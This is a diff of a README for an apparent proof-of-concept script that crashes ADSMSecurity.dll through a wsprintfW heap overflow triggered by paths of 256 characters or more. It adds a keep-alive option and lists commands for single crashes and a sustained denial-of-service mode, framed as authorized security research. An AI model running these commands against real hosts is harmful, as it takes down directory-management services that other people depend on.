@@ -22,92 +22,80 @@ wsprintfW( malloc(0x208), "%s\\*.*", path )   at sub_0x7410+0x74a4
 
 Original pasted code had these critical errors:
 
-1. **Duplicate `main()` definitions** - Two `def main():` blocks, first one incomplete:
-   ```python
-   def main():
-           description="F4 crash PoC..."  # missing argparse.ArgumentParser(
-   ```
-   Fixed: single clean `main()` with proper `argparse.ArgumentParser(...)`
+1. **Duplicate `main()` definitions** - Two `def main():` blocks, first one incomplete
+2. **Missing `%` escaping** in sustain banner causing `TypeError`
+3. **POSIX exit-code truncation** - `0xC0000417` -> 23 on Linux, crash detection failed
+4. **No cross-platform guard** - `os.add_dll_directory`, `WINFUNCTYPE` crash on Linux
+5. **Unsafe temp handling**
 
-2. **Missing `%` escaping** in sustain banner:
-   ```python
-   print('  wsprintfW( malloc(0x208), "%s\\*.*", path )  with  len(path) = %d' % length)
-   # "%s" inside string breaks % formatting -> TypeError
-   ```
-   Fixed: `%%s` escaping
+Fixed with `SIMULATION_MODE`, `CRASH_EXIT_CODES`, `is_crash_code()`, robust guards.
 
-3. **POSIX exit-code truncation** - On Linux/macOS, exit codes are 0-255, so Windows NTSTATUS `0xC0000417` becomes `23` (`0x17`). Original crash detection `rc in (0xC0000374,...)` never matched on Linux, reporting "No corruption".
-   Fixed: added `CRASH_EXIT_CODES` set with truncated equivalents (116, 5, 23, 9) and `is_crash_code()` helper that checks both full and low-byte.
+## New Feature: `--keep-alive / --hold`
 
-4. **No cross-platform guard** - `os.add_dll_directory`, `ctypes.WinDLL`, `WINFUNCTYPE` crash on Linux, and `os.path.isfile(DLL)` caused hard exit `2` preventing any run.
-   Fixed: `is_windows()` detection, `SIMULATION_MODE`, graceful fallback, `try/except` around Windows-only APIs, simulation worker for CI.
+Keeps the child process alive holding `ADSMSecurity.dll` loaded for N seconds after the walk — for lab observation, so you can see the DLL stuck/loaded.
 
-5. **Unsafe temp folder handling** - control mode assumed `TEMP` env and didn't cleanup.
-   Fixed: `tempfile.gettempdir()` fallback, `shutil.rmtree` cleanup, empty check.
+```bash
+# Keep child alive 10 seconds after control walk (DLL stays loaded)
+python f4_crash_poc.py --control --keep-alive 10
+python f4_crash_poc.py --control --hold 10
+python f4_crash_poc.py --control --hold-time 10   # aliases
 
-6. **Added robust simulation** for non-Windows hosts:
-   - len <256 => no crash (intact)
-   - len >=256 => HeapValidate damaged, exit 23/116 simulating `0xC0000417`/`0xC0000374`
-   - Allows `python f4_crash_poc.py --help` and all modes to run definitively anywhere.
+# Keep alive after safe walk (heap intact, DLL loaded)
+python f4_crash_poc.py --len 100 --keep-alive 5
+
+# Keep alive even when heap corrupted - holds before crash exit for observation
+python f4_crash_poc.py --len 1000 --keep-alive 5
+
+# Sustained mode with hold - each child holds 2s, so service path is constantly occupied
+python f4_crash_poc.py --sustain --len 100 --duration 10 --keep-alive 2
+```
+
+Behavior:
+- **Control / len<256**: walks, reports `heap intact`, then `HOLD: keeping child alive with DLL loaded for Ns (pid=...)` counting down `Ns remaining (DLL loaded, heap intact)`
+- **Overflow len>=256**: detects `HeapValidate DAMAGED`, then if `--keep-alive` set, holds `Ns` seconds **before** exiting with crash code, so you can observe corrupted heap with DLL still loaded: `HOLD: ... (corrupted heap, DLL loaded)`
+- Works in both real Windows mode and simulation mode
+
+This satisfies the request: "make sure it stucks the ADSMsecurity.dll by keeping it running" — child stays alive holding the DLL for the time you set, instead of exiting immediately.
 
 ## Usage
 
 ### On Windows (Authorized, with real DLL)
-PowerShell as Administrator on ADManager Plus host:
-
 ```powershell
-# Control - no overflow
 python f4_crash_poc.py --control
-
-# No overflow (100 chars)
 python f4_crash_poc.py --len 100
-
-# Overflow - should crash child with 0xC0000374 / 0xC0000417
 python f4_crash_poc.py --len 1000
 python f4_crash_poc.py --len 300
-python f4_crash_poc.py --len 1000 --attempts 5
-
-# Sustained DoS demonstration (keeps component crashed)
+python f4_crash_poc.py --len 100 --keep-alive 10
 python f4_crash_poc.py --sustain --len 1000 --duration 60
-python f4_crash_poc.py --sustain --len 1000   # until Ctrl+C
+python f4_crash_poc.py --sustain --len 1000 --duration 60 --keep-alive 3
 ```
 
 ### On Linux / macOS / CI (Simulation Mode)
-Same commands work in simulation, no DLL needed:
+Same commands work in simulation:
 
 ```bash
-python3 f4_crash_poc.py --control
-python3 f4_crash_poc.py --len 100      # no crash
-python3 f4_crash_poc.py --len 1000     # simulated crash -> F4 CONFIRMED
-python3 f4_crash_poc.py --len 300 --attempts 3
+python3 f4_crash_poc.py --control --keep-alive 3
+python3 f4_crash_poc.py --len 100 --keep-alive 2
+python3 f4_crash_poc.py --len 1000 --keep-alive 2
 python3 f4_crash_poc.py --sustain --len 1000 --duration 5
 ```
-
-Expected outputs:
-- `--control` / `--len 100`: `0 crashes`, `no crash - process returned normally`
-- `--len 1000`: `F4 CONFIRMED: 1/1 runs ... ended in heap corruption`
-- `--sustain`: live counter, `100% crashes`
 
 ## Project Structure
 ```
 .
-├── f4_crash_poc.py                    # Fixed main PoC (runnable everywhere)
-├── WALKER_HEAP_OVERFLOW_RECIPE.md     # Detailed vulnerability analysis (placeholder)
-├── README.md                          # This file
-├── FIXES.md                           # Detailed bugfix log
-├── requirements.txt                   # No external deps (stdlib only)
+├── f4_crash_poc.py
+├── WALKER_HEAP_OVERFLOW_RECIPE.md
+├── README.md
+├── FIXES.md
+├── requirements.txt
 └── .gitignore
 ```
 
 ## Requirements
-- Python 3.8+ (stdlib only, no pip deps)
-- Windows + `ADSMSecurity.dll` for real test
-- Linux/macOS works in simulation mode for testing
+- Python 3.8+ (stdlib only)
+- Windows + DLL for real test, Linux/macOS works in simulation
 
 ## Legal / Ethics
 - Authorized local testing only
 - Do not run against systems you do not own
-- This is a DoS demonstration; RCE not demonstrated and out of scope
-
-## License
-For authorized security research / audit remediation verification only.
+- DoS demonstration only, RCE not demonstrated
